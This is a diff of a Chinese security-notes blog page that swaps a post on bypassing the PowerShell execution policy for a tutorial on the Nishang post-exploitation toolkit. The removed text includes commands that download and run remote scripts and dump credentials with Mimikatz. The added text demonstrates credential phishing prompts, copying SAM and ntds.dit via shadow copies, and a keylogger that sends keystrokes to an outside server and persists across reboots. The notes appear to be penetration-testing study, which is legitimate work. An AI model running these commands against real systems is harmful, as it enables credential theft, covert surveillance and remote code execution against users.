@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Powershell,Windows,">
+  <meta name="keywords" content="Powershell,Windows,后渗透工具,">
 
 
 
@@ -81,20 +81,24 @@
 
 
 
-<meta name="description" content="绕过Powershell执行策略执行ps脚本。 由于powershell默认是不允许执行ps脚本的* 管理员可以改为允许 *，但ps脚本又是渗透测试中非常有用也非常必要的工具，所以想办法绕过执行策略还是非常有必要的。  总结如下 本地绕过权限执行. powershell -executionpolicy bypass -file xxx.ps1 本地隐藏绕过权限执行. powershell -ex">
-<meta name="keywords" content="Powershell,Windows">
+<meta name="description" content="Nishang模块简介及演示** Nishang **  Nishang是GitHub上的非常好用的Powershell后渗透模块，广泛用于渗透测试的各个阶段.Nishang在PowerShell3.0以上的环境才能正常使用，意思就是win7及更低版本的系统中可能使用有问题。并且会被杀软拦。  $PSVersionTable //查看PowerShell版本  Antak-Webshell //w">
+<meta name="keywords" content="Powershell,Windows,后渗透工具">
 <meta property="og:type" content="article">
-<meta property="og:title" content="绕过Powershell执行策略执行ps脚本。">
+<meta property="og:title" content="Nishang模块简介及演示">
 <meta property="og:url" content="https://github.com/scareing/scareing.github.io/2019/08/26/1566846777/index.html">
 <meta property="og:site_name" content="scareing的学习笔记">
-<meta property="og:description" content="绕过Powershell执行策略执行ps脚本。 由于powershell默认是不允许执行ps脚本的* 管理员可以改为允许 *，但ps脚本又是渗透测试中非常有用也非常必要的工具，所以想办法绕过执行策略还是非常有必要的。  总结如下 本地绕过权限执行. powershell -executionpolicy bypass -file xxx.ps1 本地隐藏绕过权限执行. powershell -ex">
+<meta property="og:description" content="Nishang模块简介及演示** Nishang **  Nishang是GitHub上的非常好用的Powershell后渗透模块，广泛用于渗透测试的各个阶段.Nishang在PowerShell3.0以上的环境才能正常使用，意思就是win7及更低版本的系统中可能使用有问题。并且会被杀软拦。  $PSVersionTable //查看PowerShell版本  Antak-Webshell //w">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/27/%E7%BB%95%E8%BF%87Powershell%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E6%89%A7%E8%A1%8Cps%E8%84%9A%E6%9C%AC%E3%80%82/1.jpg">
-<meta property="og:updated_time" content="2019-10-04T08:28:29.343Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/4.png">
+<meta property="og:updated_time" content="2019-10-04T08:28:29.546Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="绕过Powershell执行策略执行ps脚本。">
-<meta name="twitter:description" content="绕过Powershell执行策略执行ps脚本。 由于powershell默认是不允许执行ps脚本的* 管理员可以改为允许 *，但ps脚本又是渗透测试中非常有用也非常必要的工具，所以想办法绕过执行策略还是非常有必要的。  总结如下 本地绕过权限执行. powershell -executionpolicy bypass -file xxx.ps1 本地隐藏绕过权限执行. powershell -ex">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/27/%E7%BB%95%E8%BF%87Powershell%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E6%89%A7%E8%A1%8Cps%E8%84%9A%E6%9C%AC%E3%80%82/1.jpg">
+<meta name="twitter:title" content="Nishang模块简介及演示">
+<meta name="twitter:description" content="Nishang模块简介及演示** Nishang **  Nishang是GitHub上的非常好用的Powershell后渗透模块，广泛用于渗透测试的各个阶段.Nishang在PowerShell3.0以上的环境才能正常使用，意思就是win7及更低版本的系统中可能使用有问题。并且会被杀软拦。  $PSVersionTable //查看PowerShell版本  Antak-Webshell //w">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png">
 
 
 
@@ -130,7 +134,7 @@
 
 
 
-  <title>绕过Powershell执行策略执行ps脚本。 | scareing的学习笔记</title>
+  <title>Nishang模块简介及演示 | scareing的学习笔记</title>
   
 
 
@@ -284,7 +288,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">绕过Powershell执行策略执行ps脚本。</h1>
+          <h1 class="post-title" itemprop="name headline">Nishang模块简介及演示</h1>
         
 
         <div class="post-meta">
@@ -356,23 +360,52 @@
       
 
       
-        <h1 id="绕过Powershell执行策略执行ps脚本。"><a href="#绕过Powershell执行策略执行ps脚本。" class="headerlink" title="绕过Powershell执行策略执行ps脚本。"></a>绕过Powershell执行策略执行ps脚本。</h1><blockquote>
-<p>由于powershell默认是不允许执行ps脚本的<strong>* 管理员可以改为允许 *</strong>，但ps脚本又是渗透测试中非常有用也非常必要的工具，所以想办法绕过执行策略还是非常有必要的。</p>
+        <h1 id="Nishang模块简介及演示"><a href="#Nishang模块简介及演示" class="headerlink" title="Nishang模块简介及演示"></a>Nishang模块简介及演示</h1><p>** Nishang **</p>
+<blockquote>
+<p>Nishang是GitHub上的非常好用的Powershell后渗透模块，广泛用于渗透测试的各个阶段.<br>Nishang在PowerShell3.0以上的环境才能正常使用，意思就是win7及更低版本的系统中可能使用有问题。并且会被杀软拦。</p>
 </blockquote>
-<h2 id="总结如下"><a href="#总结如下" class="headerlink" title="总结如下"></a>总结如下</h2><ul>
-<li><p>本地绕过权限执行.</p>
-<pre><code>powershell -executionpolicy bypass -file xxx.ps1</code></pre></li>
-<li><p>本地隐藏绕过权限执行.</p>
-<pre><code>powershell -executionpolicy bypass -windowsstyle hideden -nologo -nonlnteractive -noprofile -file xxx.ps1</code></pre></li>
-<li><p>本地导入ps1脚本，并执行函数.</p>
-<pre><code>powershell.exe -exec bypass -Command &quot;Import-Module C:\Invoke-Mimikatz.ps1&quot;;Invoke-Mimikatz -DumpCreds</code></pre></li>
-<li><p>本地使用IEX下载远程ps1绕过执行.</p>
-<pre><code>powershell.exe &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.0.1/mimikatz.ps1&apos;); Invoke-Mimikatz -DumpCreds&quot;</code></pre></li>
-<li><p>本地使用IEX下载远程ps1隐藏绕过权限执行.</p>
-<pre><code>powershell -executionpolicy bypass -windowstyle hidden -nologo -noprofile IEX(new-object system.net.webclient).downloadstring(&quot;http://192.168.0.1/1025.ps1&quot;)    </code></pre><p>  <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/27/%E7%BB%95%E8%BF%87Powershell%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E6%89%A7%E8%A1%8Cps%E8%84%9A%E6%9C%AC%E3%80%82/1.jpg" alt="avatar"></p>
-</li>
+<pre><code>$PSVersionTable //查看PowerShell版本</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
+<ul>
+<li>Antak-Webshell //webshell</li>
+<li>Backdoor //后门</li>
+<li>Client //客户端</li>
+<li>Escalation //提权</li>
+<li>Execution //RCE</li>
+<li>Gather //信息收集</li>
+<li>Misc //杂项</li>
+<li>Pivot //跳板及远程执行exe</li>
+<li>Scan //扫描</li>
+<li>powerpreter //文件下载及持续性</li>
 </ul>
-
+<h2 id="Gather"><a href="#Gather" class="headerlink" title="Gather"></a>Gather</h2><p>** Invoke-CredentialsPhish.ps1 **</p>
+<pre><code>Invoke-CredentialsPhish //开启钓鱼</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/2.png" alt="avatar"></p>
+<blockquote>
+<p>欺骗目标主机用户输入Windows账号密码，并且如果不输入正确的账号密码，不能直接关闭。</p>
+</blockquote>
+<p>** Copy-VSS.ps1 **</p>
+<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
+<blockquote>
+<p>利用Volume Shadow Copy服务复制sam文件，如果机器是域控的话，ntds.dit和SYSTEM hive也能被拷贝出来。</p>
+</blockquote>
+<pre><code>Copy-VSS //直接把文件保存到当前路径
+Copy-VSS -DestinationDir C:\temp //保存到指定的已存在路径</code></pre><p>** FireBuster.ps1 and FireListener.ps1 **</p>
+<blockquote>
+<p>FireBuster.ps1用于被控端测试端口连通性的。<br>FireListener.ps1用于本机接收连通性测试结果。</p>
+</blockquote>
+<pre><code>FireBuster 172.22.35.250 80-100ose //被控端的80-100端口连接主机的80-100端口。
+FireListener 80-100 //主机监听80-100端口。</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/3.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/4.png" alt="avatar"><br>** Keylogger.ps1 **</p>
+<blockquote>
+<p>Nishang的键盘记录虽然很强大，但是奈何我还没有理解。<br>键盘记录默认保存在当前用户的temp目录下，默认文件名为key.log并且，内容好像是被混淆过，需要用Nishang Utility模块下的Parse_Keys.ps1来解析为明文。</p>
+</blockquote>
+<pre><code>.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis //书上是解释的说检查给出网页中是否包含stopthis也就是我们给出的字符串。如果存在就不记录。
+.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebS
+erver -URL http://192.168.254.226/data/catch.php //将记录发送到指定的可以记录Post请求的服务器。
+.\Keylogger.ps1 -persist //持久化记录，重启后依旧会继续运行。
+Parse_Keys C:\Users\wdnmd\AppData\Local\Temp\Key.log .\parsed.txt //将key.log解析到当前目录下的parsed.txt。</code></pre><p>实在无法理解为什么非要给出一个网址及字符串，但是经过尝试可以将这两个参数给定为空格。<br>** Get-PassHints.ps1 **</p>
+<blockquote>
+<p>获取用户密码的提示信息，如果有的话。</p>
+</blockquote>
+<pre><code>Get-PassHints</code></pre>
       
     </div>
     
@@ -393,6 +426,8 @@
           
             <a href="/tags/Windows/" rel="tag"># Windows</a>
           
+            <a href="/tags/后渗透工具/" rel="tag"># 后渗透工具</a>
+          
         </div>
       
 
@@ -410,8 +445,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/08/26/1566846777/" rel="prev" title="Swaks简介">
-                Swaks简介 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/08/26/1566846777/" rel="prev" title="BadUSB:虚假的恶意USB设备">
+                BadUSB:虚假的恶意USB设备 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -491,7 +526,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -502,7 +537,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -513,7 +548,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -563,7 +598,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#绕过Powershell执行策略执行ps脚本。"><span class="nav-number">1.</span> <span class="nav-text">绕过Powershell执行策略执行ps脚本。</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#总结如下"><span class="nav-number">1.1.</span> <span class="nav-text">总结如下</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Nishang模块简介及演示"><span class="nav-number">1.</span> <span class="nav-text">Nishang模块简介及演示</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Gather"><span class="nav-number">1.1.</span> <span class="nav-text">Gather</span></a></li></ol></li></ol></div>
             
 
           </div>
